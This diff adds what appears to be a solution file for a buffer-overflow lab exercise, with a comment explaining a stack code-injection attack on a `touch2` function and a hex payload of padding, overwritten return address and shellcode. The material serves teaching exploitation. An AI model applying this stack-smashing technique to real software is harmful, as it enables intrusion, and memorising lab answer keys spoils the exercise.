@@ -1,0 +1,20 @@
+/*
+ * We still inject our code at the same address in Level 1. But we should do:
+ * 1) Change the value of %rdi to the address of `cookie` located at 0x6044e4;
+ * 2) Increase %rsp to the address of the return address (which is 0x4017ec for
+ *    `touch2` function), being cautious that the offset of %rsp shoud NOT be
+ *    0x0a, or the string would be terminated here;
+ * 3) Write the return address at the chosen address.
+ *
+ * The injected assembly code is like below:
+ * Disassembly of section .text:
+ *
+ * 0000000000000000 <_start>:
+ *    0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
+ *    5:   48 83 c4 0b             add    $0xb,%rsp
+ *    9:   c3                      ret
+ *
+ * Note that these instructions DO EXACTLY occupy 0xa bytes, so we must add more
+ * paddings to it (e.g. one byte more). Here we used 0xb.
+ */
+01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 A8 DC 61 55 00 00 00 00 BF FA 97 B9 59 48 83 C4 0B C3 01 EC 17 40 00 00 00 00 00
